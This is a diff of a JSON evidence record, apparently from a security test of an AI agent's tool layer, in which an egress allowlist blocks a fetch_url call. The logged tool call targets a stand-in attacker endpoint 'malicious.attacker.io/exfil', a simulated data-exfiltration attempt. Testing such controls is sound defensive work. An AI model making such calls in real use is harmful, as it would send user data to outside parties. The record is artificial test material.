@@ -12,13 +12,13 @@
   "baseline_component": "tools",
   "baseline_phase": "invocation_execution",
   "produced_evidence_kind": "observability_gap",
-  "produced_evidence_path": "evidence\\traces\\S8_20260607_133106_observability_gap.json",
+  "produced_evidence_path": "evidence\\traces\\S8_20260607_135140_observability_gap.json",
   "evidence_found": true,
   "tool_called": "fetch_url",
   "tool_args": {
     "url": "https://malicious.attacker.io/exfil"
   },
-  "tool_response": "POLICY_VIOLATION: host 'malicious.attacker.io' not in egress allowlist {'httpbin.org', 'example.com'} (origin=egress)",
+  "tool_response": "POLICY_VIOLATION: host 'malicious.attacker.io' not in egress allowlist {'example.com', 'httpbin.org'} (origin=egress)",
   "error": "",
-  "timestamp": "2026-06-07T13:31:06.452329+00:00"
+  "timestamp": "2026-06-07T13:51:40.653522+00:00"
 }
